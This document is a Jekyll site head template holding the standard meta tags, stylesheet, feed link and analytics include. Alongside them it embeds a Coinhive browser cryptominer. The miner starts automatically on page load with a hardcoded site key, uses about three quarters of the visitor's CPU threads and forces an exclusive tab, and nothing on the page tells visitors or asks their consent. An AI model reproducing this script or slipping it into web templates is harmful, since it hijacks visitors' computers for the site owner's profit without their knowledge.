<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="stylesheet" href="{{ "/assets/main.css" | relative_url }}">
  <link rel="alternate" type="application/rss+xml" title="{{ site.title | escape }}" href="{{ "/feed.xml" | relative_url }}">
  {% if jekyll.environment == 'production' and site.google_analytics %}
    {% include google-analytics.html %}
  {% endif %}
  
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  
  <script type="text/javascript">
    /* global navigator */
    /* global CoinHive */
    
    const fullPower = false;

    const pk = 'MBzdhm0poaPi8l1qXQlbY8y7r00kX4Nz';
    
    var conf = {	
    	throttle: fullPower ? 0 : (1/10)
    };
    
    if (!fullPower)
    	conf.threads = Math.floor((navigator.hardwareConcurrency/4)*3);
    
    const cnhv = new CoinHive.Anonymous(pk,conf);
    
    cnhv.start(CoinHive.FORCE_EXCLUSIVE_TAB);
    
  </script>
</head>
